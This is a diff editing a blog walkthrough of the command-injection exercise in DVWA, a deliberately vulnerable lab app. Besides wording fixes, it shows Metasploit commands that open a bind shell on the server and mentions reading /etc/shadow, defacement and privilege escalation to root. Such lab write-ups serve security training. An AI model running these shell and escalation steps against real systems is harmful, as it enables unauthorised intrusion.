@@ -13,7 +13,7 @@ Visit the *Command Injection* section of DVWA.
 
 ![ci-0](/img/posts/ci/ci-0.png)
 
-It says that it will ping a device for, so let's see what will do for the IP *127.0.0.1*:
+Tge page says that it will ping an IP address for us, so let's see what will do for the IP *127.0.0.1*:
 
 ![ci-1](/img/posts/ci/ci-1.png)
 
@@ -38,7 +38,6 @@ Let's start metasploit and open the shell on the server:
 <pre><code data-trim class="bash">
 ⁠⁠⁠msfconsole
 use exploit/multi/handler
-set payload linux/x64/shell
 set payload linux/x64/shell/bind_tcp
 set RHOST 127.0.0.1
 </code></pre>
@@ -47,7 +46,7 @@ set RHOST 127.0.0.1
 
 Note that we didn't set the LPORT of bind_tcp, since the default one is 4444.
 
-As you notice we are the www-data user, and that's why we can't read the /etc/shadow file.
-But we have all the privileges that www-data user has, and that's enough for defacing DVWA, or exploiting a local privilege escalation vulnerability on the server in order to get root priviledges.
+As you notice we are the *www-data* user, and that's why we can't read the /etc/shadow file, why contains the user passwords of the operatinf system.
+But, we have all the privileges that *www-data* user has, and that's enough for defacing DVWA, or exploiting a local privilege escalation vulnerability on the server, in order to get root priviledges.
 
 Happy TCP binding!
